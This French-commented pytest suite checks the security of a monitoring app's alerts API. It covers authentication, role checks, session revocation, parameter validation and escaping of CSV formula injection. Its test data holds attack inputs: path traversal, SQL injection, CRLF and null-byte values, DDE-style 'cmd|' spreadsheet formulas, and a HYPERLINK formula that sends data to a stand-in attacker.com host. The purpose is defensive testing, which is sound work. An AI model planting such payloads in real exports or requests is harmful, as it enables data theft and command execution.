"""
SSM PRO-13-A.4.2.2 — Test Suite: Alerts Endpoint Security & CSV Formula Injection Hardening
Couvre les exigences des Sections 4.2, 4.3 et 4.4 :
- Authentification stricte sur GET /api/alerts et GET /api/alerts/export/csv
- Contrôle d'accès basé sur les rôles (RBAC : ADMIN, OPERATOR, AUDITOR autorisés, rôles non autorisés rejetés)
- Gestion des sessions révoquées, expirées et utilisateurs désactivés
- Validation stricte des paramètres (device_id, query, type, period, pagination limit/offset)
- Neutralisation des injections de formules CSV (=, +, -, @, \\t, \\r, \\n)
"""

import io
import csv
import time
import uuid
import pytest
from flask import session
from werkzeug.security import generate_password_hash

import config
from app import create_app
from database import get_db_session
from monitoring.models import User, UserSession, Alert, Device


@pytest.fixture(scope="module")
def test_app():
    """Crée l'application en mode test avec authentification stricte activée."""
    app, coordinator = create_app()
    app.config["TESTING"] = True
    app.config["TESTING_ENFORCE_AUTH"] = True
    app.config["WTF_CSRF_ENABLED"] = False
    return app, coordinator


def create_user_with_session(db, username, role, is_active=True):
    """Crée un utilisateur et une session active en base de données pour les tests."""
    uniq = uuid.uuid4().hex[:6]
    actual_username = f"{username}_{uniq}"
    user_id = f"test_{username}_{uniq}"
    user = User(
        id=user_id,
        username=actual_username,
        password_hash=generate_password_hash("StrongPass123!"),
        role=role,
        is_active=is_active,
        created_at=time.time()
    )
    db.add(user)
    db.flush()

    session_token = f"sess_{uuid.uuid4().hex}"
    user_sess = UserSession(
        session_token=session_token,
        user_id=user_id,
        created_at=time.time(),
        last_activity=time.time(),
        revoked=False
    )
    db.add(user_sess)
    db.commit()
    return user_id, session_token


def test_a422_01_alerts_unauthenticated_rejected(test_app):
    """Vérifie que GET /api/alerts sans session est rejeté avec HTTP 401."""
    app, _ = test_app
    with app.test_client() as client:
        res = client.get('/api/alerts')
        assert res.status_code == 401
        data = res.get_json()
        assert data["status"] == "error"
        assert "Authentification requise" in data["message"]


def test_a422_02_export_csv_unauthenticated_rejected(test_app):
    """Vérifie que GET /api/alerts/export/csv sans session est rejeté avec HTTP 401."""
    app, _ = test_app
    with app.test_client() as client:
        res = client.get('/api/alerts/export/csv')
        assert res.status_code == 401
        data = res.get_json()
        assert data["status"] == "error"
        assert "Authentification requise" in data["message"]


def test_a422_03_revoked_session_rejected(test_app):
    """Vérifie qu'une session révoquée en base est immédiatement rejetée avec HTTP 401."""
    app, coordinator = test_app
    with get_db_session() as db:
        user_id, token = create_user_with_session(db, "revoked_user", "OPERATOR")
        # Révoquer explicitement la session
        coordinator.auth_manager.revoke_session(token)

    with app.test_client() as client:
        with client.session_transaction() as sess:
            sess["user_id"] = user_id
            sess["username"] = "revoked_user"
            sess["role"] = "OPERATOR"
            sess["session_token"] = token

        res = client.get('/api/alerts')
        assert res.status_code == 401
        data = res.get_json()
        assert data["status"] == "error"
        assert "Session révoquée" in data["message"]


def test_a422_04_disabled_user_rejected(test_app):
    """Vérifie qu'un compte utilisateur désactivé (is_active=False) est rejeté avec HTTP 401."""
    app, _ = test_app
    with get_db_session() as db:
        user_id, token = create_user_with_session(db, "inactive_user", "OPERATOR", is_active=False)

    with app.test_client() as client:
        with client.session_transaction() as sess:
            sess["user_id"] = user_id
            sess["username"] = "inactive_user"
            sess["role"] = "OPERATOR"
            sess["session_token"] = token

        res = client.get('/api/alerts')
        assert res.status_code == 401


def test_a422_05_unauthorized_role_rejected(test_app):
    """Vérifie qu'un utilisateur avec un rôle non autorisé (ex: GUEST / VIEWER) est rejeté avec HTTP 403."""
    app, _ = test_app
    with get_db_session() as db:
        user_id, token = create_user_with_session(db, "guest_user", "GUEST")

    with app.test_client() as client:
        with client.session_transaction() as sess:
            sess["user_id"] = user_id
            sess["username"] = "guest_user"
            sess["role"] = "GUEST"
            sess["session_token"] = token

        res = client.get('/api/alerts')
        assert res.status_code == 403
        data = res.get_json()
        assert data["status"] == "error"
        assert "Action non autorisée" in data["message"]

        res_csv = client.get('/api/alerts/export/csv')
        assert res_csv.status_code == 403


def test_a422_06_operator_role_authorized(test_app):
    """Vérifie qu'un utilisateur avec le rôle OPERATOR peut consulter et exporter les alertes."""
    app, _ = test_app
    with get_db_session() as db:
        user_id, token = create_user_with_session(db, "valid_operator", "OPERATOR")

    with app.test_client() as client:
        with client.session_transaction() as sess:
            sess["user_id"] = user_id
            sess["username"] = "valid_operator"
            sess["role"] = "OPERATOR"
            sess["session_token"] = token

        res = client.get('/api/alerts')
        assert res.status_code == 200
        assert isinstance(res.get_json(), list)

        res_csv = client.get('/api/alerts/export/csv')
        assert res_csv.status_code == 200
        assert "text/csv" in res_csv.content_type


def test_a422_07_auditor_role_authorized(test_app):
    """Vérifie qu'un utilisateur avec le rôle AUDITOR peut consulter et exporter les alertes."""
    app, _ = test_app
    with get_db_session() as db:
        user_id, token = create_user_with_session(db, "valid_auditor", "AUDITOR")

    with app.test_client() as client:
        with client.session_transaction() as sess:
            sess["user_id"] = user_id
            sess["username"] = "valid_auditor"
            sess["role"] = "AUDITOR"
            sess["session_token"] = token

        res = client.get('/api/alerts')
        assert res.status_code == 200
        assert isinstance(res.get_json(), list)

        res_csv = client.get('/api/alerts/export/csv')
        assert res_csv.status_code == 200


def test_a422_08_admin_role_authorized(test_app):
    """Vérifie qu'un utilisateur avec le rôle ADMIN peut consulter et exporter les alertes."""
    app, _ = test_app
    with get_db_session() as db:
        user_id, token = create_user_with_session(db, "valid_admin", "ADMIN")

    with app.test_client() as client:
        with client.session_transaction() as sess:
            sess["user_id"] = user_id
            sess["username"] = "valid_admin"
            sess["role"] = "ADMIN"
            sess["session_token"] = token

        res = client.get('/api/alerts')
        assert res.status_code == 200

        res_csv = client.get('/api/alerts/export/csv')
        assert res_csv.status_code == 200


def test_a422_09_device_id_validation_and_perimeter(test_app):
    """Vérifie la validation de l'identifiant d'appareil et le contrôle de périmètre."""
    app, coordinator = test_app
    with get_db_session() as db:
        user_id, token = create_user_with_session(db, "device_tester", "OPERATOR")

    # S'assurer d'un appareil enregistré
    devs = coordinator.device_store.get_all_devices()
    valid_dev_id = devs[0]["id"] if devs else "dev_01"

    with app.test_client() as client:
        with client.session_transaction() as sess:
            sess["user_id"] = user_id
            sess["username"] = "device_tester"
            sess["role"] = "OPERATOR"
            sess["session_token"] = token

        # Appareil valide existant -> 200
        res_ok = client.get(f'/api/alerts?device_id={valid_dev_id}')
        assert res_ok.status_code == 200

        # Identifiant d'appareil avec injection / traversée -> 400
        res_bad = client.get('/api/alerts?device_id=../etc/passwd')
        assert res_bad.status_code == 400

        res_bad2 = client.get('/api/alerts?device_id=dev_01;DROP+TABLE')
        assert res_bad2.status_code == 400

        # Appareil introuvable ou non configuré -> 404
        res_missing = client.get('/api/alerts?device_id=nonexistent_dev_999')
        assert res_missing.status_code == 404

        # Export CSV avec appareil invalide -> 400 / 404
        res_csv_bad = client.get('/api/alerts/export/csv?device_id=../bad')
        assert res_csv_bad.status_code == 400

        res_csv_missing = client.get('/api/alerts/export/csv?device_id=nonexistent_dev_999')
        assert res_csv_missing.status_code == 404


def test_a422_10_pagination_and_query_validation(test_app):
    """Vérifie la robustesse face aux paramètres de pagination et filtres invalides."""
    app, _ = test_app
    with get_db_session() as db:
        user_id, token = create_user_with_session(db, "param_tester", "OPERATOR")

    with app.test_client() as client:
        with client.session_transaction() as sess:
            sess["user_id"] = user_id
            sess["username"] = "param_tester"
            sess["role"] = "OPERATOR"
            sess["session_token"] = token

        # Limit négatif -> 400
        assert client.get('/api/alerts?limit=-5').status_code == 400
        # Limit non entier -> 400
        assert client.get('/api/alerts?limit=not_an_int').status_code == 400
        # Offset négatif -> 400
        assert client.get('/api/alerts?offset=-1').status_code == 400
        # Offset non entier -> 400
        assert client.get('/api/alerts?offset=abc').status_code == 400
        # Period invalide -> 400
        assert client.get('/api/alerts?period=last_century').status_code == 400

        # Caractères de contrôle dans type ou query -> 400
        assert client.get('/api/alerts?type=test%00null').status_code == 400
        assert client.get('/api/alerts?query=test%0d%0ainjection').status_code == 400

        # Pagination valide avec clamp extrême
        res_extreme = client.get('/api/alerts?limit=9999999')
        assert res_extreme.status_code == 200


def test_a422_11_csv_formula_injection_sanitization(test_app):
    """Démontre la neutralisation rigoureuse des injections de formules CSV sur toutes les cellules contrôlables."""
    _, coordinator = test_app

    # Injecter des alertes avec des charges utiles de type Formula Injection
    malicious_alerts = [
        {
            "id": "alert_sec_01",
            "datetime": "2026-11-26 18:00:00",
            "device_name": "=cmd|'/C calc'!A0",
            "device_id": "dev_01",
            "device_ip": "192.168.1.100",
            "type": "+2+5+cmd|'/C calc'!A0",
            "event_code": "-2+3",
            "category": "@SUM(1+1)*cmd|' /C calc'!A0",
            "severity": "CRITIQUE",
            "details": "\t=HYPERLINK(\"http://attacker.com/leak?data=\", \"Cliquez ici\")",
            "measured_value": -5.2,  # Nombre légitime
            "threshold": 10.0,
            "status": "ACTIF"
        },
        {
            "id": "alert_sec_02",
            "datetime": "2026-11-26 18:01:00",
            "device_name": "  =cmd|' /C calc'!A0",
            "device_id": "dev_01",
            "device_ip": "192.168.1.100",
            "type": "\r-dangerous_return",
            "event_code": "\n+dangerous_newline",
            "category": "ÉVÉNEMENT NORMAL",
            "severity": "INFO",
            "details": "Légitime observation sans formule",
            "measured_value": 0.0,
            "threshold": 5.0,
            "status": "NORMAL"
        }
    ]

    csv_data = coordinator.recording_manager.export_csv(alerts=malicious_alerts)
    reader = csv.DictReader(io.StringIO(csv_data), delimiter=';')
    rows = list(reader)

    assert len(rows) == 2

    # Vérification Alerte 1
    r1 = rows[0]
    # Les préfixes dangereux =, +, -, @, \t doivent être préfixés d'une apostrophe (')
    assert r1["device_name"].startswith("'=")
    assert r1["type"].startswith("'+")
    assert r1["event_code"].startswith("'-")
    assert r1["category"].startswith("'@")
    assert r1["details"].startswith("'\t")
    # Les valeurs numériques pures ne doivent pas être altérées
    assert r1["measured_value"] == "-5.2"

    # Vérification Alerte 2
    r2 = rows[1]
    assert r2["device_name"].startswith("'  =")
    assert r2["type"].startswith("'\r-")
    assert r2["event_code"].startswith("'\n+")
    assert r2["category"] == "ÉVÉNEMENT NORMAL"
    assert r2["details"] == "Légitime observation sans formule"
